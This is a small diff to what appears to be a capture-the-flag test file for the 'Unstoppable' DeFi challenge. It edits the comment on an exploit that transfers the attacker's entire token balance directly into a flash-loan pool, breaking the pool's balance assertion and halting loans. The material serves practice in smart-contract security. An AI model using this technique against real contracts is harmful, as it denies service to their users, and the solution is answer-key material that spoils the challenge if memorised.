@@ -52,7 +52,8 @@ describe('[Challenge] Unstoppable', function () {
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
     const attackerBalance = await this.token.balanceOf(attacker.address);
-    // Send some tokens to the pool
+    // Break the assert by sending some tokens to the pool
+    // so it has more tokens than calculated after a deposit
     await this.token
       .connect(attacker)
       .transfer(this.pool.address, attackerBalance);
